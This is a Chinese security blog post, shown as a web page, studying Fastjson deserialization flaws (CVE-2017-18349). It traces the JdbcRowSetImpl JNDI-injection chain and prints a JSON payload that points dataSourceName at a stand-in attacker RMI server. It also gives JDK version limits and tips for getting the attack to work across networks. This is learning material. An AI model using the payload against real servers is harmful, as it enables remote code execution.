<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Fastjson漏洞学习 | MTRleed</title><meta name="keywords" content="反序列化"><meta name="author" content="MTRleed"><meta name="copyright" content="MTRleed"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言Fastjson是一个Java语言编写的高性能功能完善的开源JSON解析库，属于阿里巴巴。用于对JSON格式的数据进行解析和打包，能够支持将java bean序列化成JSON字符串， 也能够将JSON字符串反序列化成Java bean。简单说就是可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象，而且十分简洁。 12345678String tex">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson漏洞学习">
<meta property="og:url" content="https://www.mtrleed.top/post/11/index.html">
<meta property="og:site_name" content="MTRleed">
<meta property="og:description" content="前言Fastjson是一个Java语言编写的高性能功能完善的开源JSON解析库，属于阿里巴巴。用于对JSON格式的数据进行解析和打包，能够支持将java bean序列化成JSON字符串， 也能够将JSON字符串反序列化成Java bean。简单说就是可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象，而且十分简洁。 12345678String tex">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/fastjson.jpg">
<meta property="article:published_time" content="2022-06-19T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-30T08:38:55.583Z">
<meta property="article:author" content="MTRleed">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/fastjson.jpg"><link rel="shortcut icon" href="/img/aa.png"><link rel="canonical" href="https://www.mtrleed.top/post/11/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Fastjson漏洞学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-30 16:38:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/js/myjs.js"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="MTRleed" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/ig.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/fastjson.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MTRleed</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson漏洞学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-19T16:00:00.000Z" title="发表于 2022-06-20 00:00:00">2022-06-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-30T08:38:55.583Z" title="更新于 2023-11-30 16:38:55">2023-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson漏洞学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson是一个Java语言编写的高性能功能完善的开源JSON解析库，属于阿里巴巴。用于对JSON格式的数据进行解析和打包，能够支持将java bean序列化成JSON字符串， 也能够将JSON字符串反序列化成Java bean。简单说就是可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象，而且十分简洁。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String text = JSON.toJSONString(obj); <span class="comment">//序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">// 反序列化</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>); <span class="comment">//反序列化，解析为JSONObject类型或者JSONArray类型，JSONArray类型可以想象成多个JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="comment">//反序列化，JSON文本解析成VO.class类</span></span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line">toJSONString()会调用get方法，parseObject() 能同时触发所有的set和get方法，parse()只会调用set方法</span><br><span class="line">如果在get或set方法存入恶意操作，并且通过autoType(@type)进行指定转换利用，最终会造成fastjson 反序列化漏洞</span><br></pre></td></tr></table></figure>

<h3 id="set和get"><a href="#set和get" class="headerlink" title="set和get"></a>set和get</h3><p>set和get这两个方法是对数据进行设置和获取用的，set方法是初始化和赋值时调用。而且，在类中使用set和get方法时，都是在set和get后面跟上一些特定的词来形成特定意思的方法名，比如setage（）和getage（），表示设置年龄和获取年龄。JAVA中的封闭性和安全性，封闭性即对类中的域变量进行封闭操作，即用private来修饰他们，如此一来其他类则不能对该变量访问。这样我们就将这些变量封闭在了类内部，这样就提高了数据的安全性，当我们想要操作这些域变量怎么办呢？我们可以通过两种方法：<br>第一种即通过public方式的构造器（或称构造函数），对象一实例化就对该变量赋值。<br>第二种就是通过上面提到的set和get方法，举一个特定的例子，定义一个<br>Person类，<br>该类中有name、age这两个私有域变量，<br>定义setname（）、getname（）、setage（）、getage（）这四个方法，<br>通过这四个方法来实现对name和age的操作。这样一来，不用直接对Person类中的域变量操作，而是通过set和get方法间接地操作这些变量，这样就能提高域变量的安全性，同时又保证了域变量的封装型。</p>
<p>最后说说set和get方法的使用场景，一般来说set和get方法都是对私有域变量进行操作的，所以大多数都是使用在包含特定属性的类实体中。<br>这两个方法只是类中的setxxx和getxxx方法的总称，给他赋值就用u.setXXX();  取这个类的对象的某个值 就get。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;<span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> java.lang.<span class="function">String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(java.lang.String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="fastjson的使用"><a href="#fastjson的使用" class="headerlink" title="fastjson的使用"></a>fastjson的使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在pom.xml中通过配置maven依赖：</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line">然后在需要的类中进行应用，如：</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br></pre></td></tr></table></figure>

<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>1.有报错回显<br>我们可以以POST方式发送一个不闭合花括号的方式，使网站给我们显示报错包，在回显包中会有json类型的信息<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.jpg"></p>
<p>​      </p>
<p>2.无报错回显<br>可使用DNSlog来回显</p>
<h3 id="CVE-2017-18349-Fastjson-lt-1-2-24反序列化-rce"><a href="#CVE-2017-18349-Fastjson-lt-1-2-24反序列化-rce" class="headerlink" title="(CVE-2017-18349)Fastjson&lt;=1.2.24反序列化-rce"></a>(CVE-2017-18349)Fastjson&lt;=1.2.24反序列化-rce</h3><p>fastjson在解析json的过程中，支持使用autoType也就是<code>@type</code>来实例化某一个具体的类，并调用该类的set/get方法来访问属性，可以使得fastjson支持自省，目的是为了让开发者更加方便的使用Fastjson的一系列功能，只要JSON字符串中包含 @type ，那么 @type 后的属性，就会被当做是 @type 所指定的类的属性，从而在不传递第二个参数的情况下让Fastjson明确要还原的类，但是此功能也是造成漏洞的原因，通过查找代码中相关的类和方法，即可构造出一些恶意利用链。具体漏洞的形成原因是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查从而导致用户在构造恶意攻击链并传入，可造成任意命令执行漏洞。</p>
<p>就比如：<br>JSON.toJSONString(object,SerializerFeature.WriteClassName)这个方法中存在的一个参数<code>SerializerFeature.WriteClassName</code>，它会使序列化后的数据带有<code>@type</code>表明所属的类，在对JSON数据进行反序列化的时候，会去调用指定类中的get/set/is方法。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"></p>
<p>所以如果我们在序列化的时候添加了<code>@type</code>参数，是不是可以在反序列化的时候，通过控制<code>@type</code>键的值也就是上面的”Student”来控制该序列化数据要被反序列化成什么样的对象，即调用什么类的set方法。于是我们需要在fastjson中找到一个合适的类，它可以被用来完成我们想要的功能。</p>
<h4 id="fastjson反序列化过程"><a href="#fastjson反序列化过程" class="headerlink" title="fastjson反序列化过程"></a>fastjson反序列化过程</h4><p>我们先编写一个类，随后使用数据进行反序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;<span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String date;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(String date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="comment">//import com.sun.rowset.JdbcRowSetImpl;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*Student student = new Student();//无参构造</span></span><br><span class="line"><span class="comment">        student.setId(1);</span></span><br><span class="line"><span class="comment">        student.setName(&quot;张三&quot;);</span></span><br><span class="line"><span class="comment">        String studentJson = JSON.toJSONString(student, SerializerFeature.WriteClassName);//序列化</span></span><br><span class="line"><span class="comment">        System.out.println(studentJson);*/</span></span><br><span class="line">        String jsonstring =<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Student\&quot;:\&quot;id\&quot;:8,\&quot;name\&quot;:\&quot;mtrleed\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//System.out.println(JSON.parse(jsonstring));</span></span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));<span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>在parseObject这里打个断点，方便待会跟。<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9617.png"></p>
<p>​       </p>
<p>前面跟的有点头晕，一路来到scanSymbol()方法，它会读取到@type关键字<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%967.png"></p>
<p>​      </p>
<p>然后通过 TypeUtils.loadClass() 方法来加载 Class，优先从 mappings 里面寻找类，mappings 中存放着一些 Java 内置类，在里面查找不到，所以最后用 ClassLoader() 加载类，也就是加载我们的实验类 org.example.Student 类<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%968.png"></p>
<p>​      </p>
<p>往下跟会调用 deserialze()方法(反序列化程序)，在反序列化之前先使用getDeserializer() 方法获取反序列化数据<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%969.png"></p>
<p>接着继续在getDeserializer() 方法往下，这里使用了拒绝列表(黑名单)的方式进行过滤，但是里面只有Thread<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9610.png"></p>
<p>再往后就是调用get/set方法进行数据的获取和赋值。</p>
<p>​       </p>
<p>针对fastjson反序列化，网上师傅们三条常用的这三条链：JdbcRowSetImpl(JdbcRowSetImpl利用链最终的结果是导致 JNDI 注入)、TemplatesImpl（需要开启 Feature.SupportNonPublicField 实战中不适用)、BasicDataSource(系统不出网时使用) 。</p>
<h4 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h4><p>因为JdbcRowSetImpl利用的最后是造成的JDNI注入，所以首先我们先来了解一些必要的概念。<strong>RMI、JNDI、JRMP协议、LDAP协议</strong>。(可以移步我以往文章)</p>
<p>JNDI查找远程对象时InitialContext.lookup(URL)的参数URL可以覆盖一些上下文中的属性，比如：Context.PROVIDER_URL。Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，可以进行JNDI注入。也就是说JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。</p>
<p>JNDI注入（这里指修改JNDI查找远程的对象）：</p>
<p>JDNI 注入所需要的RMI和LDAP对JDK是有限制的，高版本的JDK不适用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于rmi的利用方式：</span><br><span class="line">适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前。 在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line"></span><br><span class="line">基于ldap的利用方式：</span><br><span class="line">适用jdk版本：JDK 6u211，JDK 7u201，JDK 8u191，JDK 11.0.1之前。 在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。 </span><br></pre></td></tr></table></figure>

<p>可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</p>
<p>下面开始分析JdbcRowSetImpl链：<br>JdbcRowSetImpl的局限是<strong>必须能出网去加载远端的恶意字节码</strong>，该类是JDK自带的，完整类地址com.sun.rowset.JdbcRowSetImpl 。<br>POC 如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为 RMI 服务中心绑定的 Exploit 服务，autoCommit有且必须为 true 或 false 等布尔值类型：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://hacker_server/xxx&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>瞅瞅这个类:<br>进入JdbcRowSetImpl，找到setDataSourceNmame()：<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png"></p>
<p>首先判断getDataSourceName()是否为空，若为空则进入else对其进行赋值，将dsName传给它。</p>
<p>​      </p>
<p>来到getDataSourceName()方法处查看一下他的返回值<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"></p>
<p>getDataSourceName()返回值是字符串类型的dataSource，而我们在反序列化时它是空的，所以表明setDataSourceNmame()会默认自动调用setDataSourceName()为DataSourceName赋值（DataSourceName在connect()中，后面讲）。</p>
<p>​      </p>
<p>回到com.sun.rowset.JdbcRowSetImpl类中的com.sun.rowset.JdbcRowSetImpl.setAutocommit()方法：<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%964.png"></p>
<p>这里有一个重要的方法调用com.sun.rowset.JdbcRowSetImpl.connect()</p>
<p>​      </p>
<p>找到com.sun.rowset.JdbcRowSetImpl.connect()<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%965.png"></p>
<p>connect()方法最终执行了lookup()方法，lookup()方法就是JNDI中访问远程服务器获取远程对象的方法，其参数getDataSourceName()为服务器地址，而getDataSourceName是获取DataSourceName值的方法，我们要是控制了setDataSourceName方法的参数比如设置成自己的VPS，这样就可以访问到自己的服务器了。刚好我们知道Fastjson在反序列化的时候，会自动调用所有的set方法，于是正好可以通过setDataSourceName对DataSourceName进行赋值。</p>
<p>总的来说这个链原理，FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。而JDK中的JdbcRowSetImpl类的setAutoCommit()会调用connect()函数，connect()函数又会调用InitialContext.lookup(dataSourceName)，这里的参数dataSourceName是在setter方法setDataSourceName(ds Name)中设置的。所以在FastJson反序列化漏洞过程中，我们是可以控制dataSourceName的值的*，也就是说满足了JNDI注入利用的条件</p>
<p>lookup()方法是JNDI中访问远程服务器获取远程对象的方法，找到com.sun.jndi.rmi.registry.RegistryContext.lookup()想看看具体实现过程，是怎样lookup的，大概是触发lookup()，加载远程恶意对象,后面decodeObject()方法，加载远程Reference绑定的恶意对象(我看不太懂，但是我大为震撼)<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%966.png"></p>
<p>好了，com.sun.rowset.JdbcRowSetImpl链到这就结束了。</p>
<p>！！注意：<br>在本地测试的过程中，POC通常是可以得到结果的，但是进行远程或者不同网络的时候往往会出现请求超时的结果(timeout) ，为什么会出现这种情况呢？<br>有师傅分析，在使用RMI Registry时服务端会使用两个端口服务，一个是监听端口(默认1099)，另一个是远程通信的host和port是由RMI Registry传递给客户端(攻击机)且port是随机分配，host默认值是服务端本地主机名对应的IP地址，大多数情况下是一个内网IP没错了，127.0.1.1。关于127.0.1.1，这个是127.0.0.0/8段下面的一个ip，出现在/etc/hosts文件中的，可以用来解析自己的主机名。</p>
<p>尝试应对：可以把/etc/hosts中指向内网IP的记录删除或者指向外网IP(服务端也属于你的情况下)，也可以在攻击者的RMI服务端通过代码明确指定远程对象通信Host IP：</p>
